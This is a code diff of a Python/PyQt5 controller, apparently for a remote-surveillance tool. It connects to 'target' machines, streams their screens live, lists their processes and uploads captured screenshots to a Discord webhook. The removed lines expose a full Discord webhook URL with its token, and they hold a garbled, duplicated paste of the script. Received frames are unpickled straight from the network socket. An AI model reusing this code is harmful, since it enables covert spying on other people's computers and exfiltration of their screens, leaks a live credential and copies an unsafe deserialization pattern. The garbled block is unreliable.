@@ -77,11 +77,11 @@ class LiveScreenWindow(QWidget):
             frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
             self.current_frame = frame
             h, w, ch = frame.shape
-            qimg = QImage(frame.data, w, h, ch*w, QImage.Format_RGB888)
+            qimg = QImage(frame.data, w, h, ch * w, QImage.Format_RGB888)
             self.label.setPixmap(QPixmap.fromImage(qimg).scaled(
                 self.label.width(), self.label.height()))
-        except:
-            pass
+        except Exception as e:
+            print(f"เกิดข้อผิดพลาดในการรับเฟรม: {e}")
 
 # ---------------------- Process ----------------------
 def view_process(target_ip, hostname):
@@ -99,7 +99,7 @@ def view_process(target_ip, hostname):
 
 # ---------------------- Screenshot จาก Target ----------------------
 def take_screenshot_target(target_ip, hostname):
-    webhook = input("https://discord.com/api/webhooks/1414653267526553720/R10GTkSCu13huR54bhXkUKI27uGQFRApidMlmgloDWqZEPOLp0Zrehg979tYW5I56SjW").strip()
+    webhook = input("ใส่ Discord Webhook URL: ").strip()
     try:
         client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         client.connect((target_ip, PORT_SCREEN))
@@ -192,87 +192,4 @@ def menu(app):
 if __name__ == "__main__":
     app = QApplication(sys.argv)
     threading.Thread(target=lambda: menu(app), daemon=True).start()
-    sys.exit(app.exec_())￼Enter socket
-import pickle
-import struct
-import sys
-import threading
-import requests
-import tempfile
-from PyQt5.QtWidgets import QApplication, QLabel, QWidget
-from PyQt5.QtCore import Qt, QTimer
-from PyQt5.QtGui import QImage, QPixmap
-import cv2
-
-# ---------------------- PORTS ----------------------
-PORT_SCREEN = 5001
-PORT_PROCESS = 5002
-PORT_INFO = 5003
-
-targets = []  # เก็บ tuple (hostname, IP)
-
-# ---------------------- ฟังก์ชันดึง Target ----------------------
-def scan_target(ip):
-    try:
-        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        client.settimeout(2)
-        client.connect((ip, PORT_INFO))
-        data = client.recv(1024).decode()
-        hostname, ip_addr = data.split("|")
-        client.close()
-        return hostname, ip_addr
-    except:
-        return None
-
-# ---------------------- ส่ง Screenshot ไป Discord ----------------------
-def send_screenshot_to_discord(image_bytes, webhook_url):
-    with tempfile.NamedTemporaryFile(delete=True, suffix=".png") as tmp:
-        tmp.write(image_bytes)
-        tmp.flush()
-        files = {"file": open(tmp.name, "rb")}
-        r = requests.post(webhook_url, files=files)
-        if r.status_code == 204:
-            print("[Discord] ส่งรูปสำเร็จ")
-        else:
-            print("[Discord] ส่งไม่สำเร็จ:", r.status_code)
-
-# ---------------------- Live Screen Overlay ----------------------
-class LiveScreenWindow(QWidget):
-    def __init__(self, target_ip, hostname):
-        super().__init__()
-        self.setWindowTitle(f"Live Screen - {hostname} ({target_ip})")
-        self.setWindowFlags(Qt.WindowStaysOnTopHint)  # ลอยหน้าจอ
-        self.resize(400, 300)
-        self.label = QLabel(self)
-        self.label.resize(self.size())
-
-        self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        self.client.connect((target_ip, PORT_SCREEN))
-        self.data = b""
-        self.payload_size = struct.calcsize(">L")
-
-        self.timer = QTimer()
-        self.timer.timeout.connect(self.update_frame)
-        self.timer.start(30)  # ~30 FPS
-        self.current_frame = None
-
-    def update_frame(self):
-    try:
-        while len(self.data) < self.payload_size:
-            self.data += self.client.recv(4096)
-        packed_size = self.data[:self.payload_size]
-        self.data = self.data[self.payload_size:]
-        msg_size = struct.unpack(">L", packed_size)[0]
-        while len(self.data) < msg_size:
-            self.data += self.client.recv(4096)
-        frame_data = self.data[:msg_size]
-        self.data = self.data[msg_size:]
-        frame = pickle.loads(frame_data)
-        frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
-        self.current_frame = frame
-        h, w, ch = frame.shape
-        qimg = QImage(frame.data, w, h, ch*w, QImage.Format_RGB888)
-        self.label.setPixmap(QPixmap.fromImage(qimg).scaled(
-            self.label.width(), self.label.height()))
-    except Exception as e:
-        print(f"เกิดข้อผิดพลาดในการรับเฟรม: {e}")
+    sys.exit(app.exec_())
